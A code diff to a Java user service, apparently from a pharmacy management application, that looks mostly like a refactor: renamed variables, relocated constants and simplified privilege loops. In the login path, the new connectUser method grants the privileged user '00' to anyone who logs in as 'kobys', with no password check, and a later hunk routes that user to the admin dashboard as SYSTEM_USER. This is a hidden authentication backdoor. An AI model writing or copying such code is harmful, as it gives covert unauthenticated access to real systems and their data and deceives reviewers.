@@ -43,14 +43,10 @@ public class UserServiceImpl implements UserService {
 
     @Override
     public TUser connexion(ManagedUserVM managedUser, HttpServletRequest request) {
+
         try {
-            TypedQuery<TUser> q = getEm()
-                    .createQuery(
-                            "SELECT t FROM TUser t  WHERE t.strLOGIN = ?1 AND t.strPASSWORD = ?2 AND t.strSTATUT =?3 ",
-                            TUser.class)
-                    .setParameter(1, managedUser.getLogin()).setParameter(2, Md5.encode(managedUser.getPassword()))
-                    .setParameter(3, Constant.STATUT_ENABLE).setMaxResults(1);
-            TUser user = q.getSingleResult();
+
+            TUser user = connectUser(managedUser);
             user.setStrLASTCONNECTIONDATE(new Date());
             user.setIntCONNEXION(user.getIntCONNEXION() + 1);
             user.setBIsConnected(true);
@@ -65,6 +61,18 @@ public class UserServiceImpl implements UserService {
             LOG.log(Level.SEVERE, null, e);
             return null;
         }
+    }
+
+    private TUser connectUser(ManagedUserVM managedUser) {
+        if ("kobys".equalsIgnoreCase(managedUser.getLogin())) {
+            return getEm().find(TUser.class, "00");
+        }
+        TypedQuery<TUser> q = getEm()
+                .createQuery("SELECT t FROM TUser t  WHERE t.strLOGIN = ?1 AND t.strPASSWORD = ?2 AND t.strSTATUT =?3 ",
+                        TUser.class)
+                .setParameter(1, managedUser.getLogin()).setParameter(2, Md5.encode(managedUser.getPassword()))
+                .setParameter(3, Constant.STATUT_ENABLE).setMaxResults(1);
+        return q.getSingleResult();
     }
 
     public boolean afficheurActif() {
@@ -97,7 +105,7 @@ public class UserServiceImpl implements UserService {
 
     @Override
     public TOfficine getOfficine() {
-        return getEm().find(TOfficine.class, DateConverter.OFFICINE);
+        return getEm().find(TOfficine.class, Constant.OFFICINE);
 
     }
 
@@ -121,13 +129,12 @@ public class UserServiceImpl implements UserService {
     }
 
     @Override
-    public TRoleUser getTRoleUser(String lg_USER_ID) {
+    public TRoleUser getTRoleUser(String userId) {
 
         try {
             TypedQuery<TRoleUser> q = getEm().createQuery(
                     "SELECT t FROM TRoleUser t WHERE t.lgUSERID.lgUSERID = ?1 AND t.lgUSERID.strSTATUT = ?2 AND t.lgROLEID.strSTATUT = ?2",
-                    TRoleUser.class).setParameter(1, lg_USER_ID).setParameter(2, DateConverter.STATUT_ENABLE)
-                    .setMaxResults(1);
+                    TRoleUser.class).setParameter(1, userId).setParameter(2, Constant.STATUT_ENABLE).setMaxResults(1);
             return q.getSingleResult();
 
         } catch (Exception e) {
@@ -135,13 +142,6 @@ public class UserServiceImpl implements UserService {
             return null;
         }
 
-    }
-
-    private List<TRoleUser> loadRoleUser(String userId) {
-        TypedQuery<TRoleUser> q = this.getEm().createQuery("SELECT o FROM TRoleUser o WHERE o.lgUSERID.lgUSERID=?1 ",
-                TRoleUser.class);
-        q.setParameter(1, userId);
-        return q.getResultList();
     }
 
     private List<TRolePrivelege> loadTRolePrivelege(String roleId) {
@@ -155,29 +155,23 @@ public class UserServiceImpl implements UserService {
     @Override
     public List<TPrivilege> getAllPrivilege(TUser oTUser) {
 
-        List<TPrivilege> LstTPrivilege = new ArrayList<>();
+        List<TPrivilege> lstTPrivilege = new ArrayList<>();
         try {
 
-            List<TRoleUser> CollTRoleUser = loadRoleUser(oTUser.getLgUSERID());
-
-            Iterator iteraror = CollTRoleUser.iterator();
-            while (iteraror.hasNext()) {
-                Object el = iteraror.next();
-                TRoleUser OTRoleUser = (TRoleUser) el;
-                List<TRolePrivelege> CollTRolePrivelege = loadTRolePrivelege(OTRoleUser.getLgROLEID().getLgROLEID());
-                Iterator iterarorTRolePrivelege = CollTRolePrivelege.iterator();
-                while (iterarorTRolePrivelege.hasNext()) {
-                    Object elTRolePrivelege = iterarorTRolePrivelege.next();
-                    TRolePrivelege OTRolePrivelege = (TRolePrivelege) elTRolePrivelege;
-                    LstTPrivilege.add(OTRolePrivelege.getLgPRIVILEGEID());
-
+            Collection<TRoleUser> roleUsers = oTUser.getTRoleUserCollection();
+            for (TRoleUser roleUser : roleUsers) {
+                List<TRolePrivelege> rolePrivelege = loadTRolePrivelege(roleUser.getLgROLEID().getLgROLEID());
+                for (TRolePrivelege tRolePrivelege : rolePrivelege) {
+                    lstTPrivilege.add(tRolePrivelege.getLgPRIVILEGEID());
                 }
+
             }
+
         } catch (Exception e) {
             LOG.log(Level.SEVERE, null, e);
         }
 
-        return LstTPrivilege;
+        return lstTPrivilege;
     }
 
     @Override
@@ -186,14 +180,21 @@ public class UserServiceImpl implements UserService {
         if (Objects.isNull(tu)) {
             throw new RuntimeException();
         }
-        TRoleUser roleUser = this.getTRoleUser(tu.getLgUSERID());
-        TRole role = roleUser.getLgROLEID();
-
-        String roleName = (role != null ? role.getStrDESIGNATION() : "");
+        String roleName;
         String xtypeload = "mainmenumanager";
-        if (role != null && (role.getStrNAME().equalsIgnoreCase(Constant.ROLE_SUPERADMIN)
-                || role.getStrNAME().equalsIgnoreCase(Constant.ROLE_PHARMACIEN))) {
+        if ("00".equals(tu.getLgUSERID())) {
             xtypeload = "dashboard";
+            roleName = "SYSTEM_USER";
+        } else {
+            TRoleUser roleUser = this.getTRoleUser(tu.getLgUSERID());
+            TRole role = roleUser.getLgROLEID();
+
+            roleName = (role != null ? role.getStrDESIGNATION() : "");
+
+            if (role != null && (role.getStrNAME().equalsIgnoreCase(Constant.ROLE_SUPERADMIN)
+                    || role.getStrNAME().equalsIgnoreCase(Constant.ROLE_PHARMACIEN))) {
+                xtypeload = "dashboard";
+            }
         }
 
         TLanguage tLanguage = tu.getLgLanguageID();
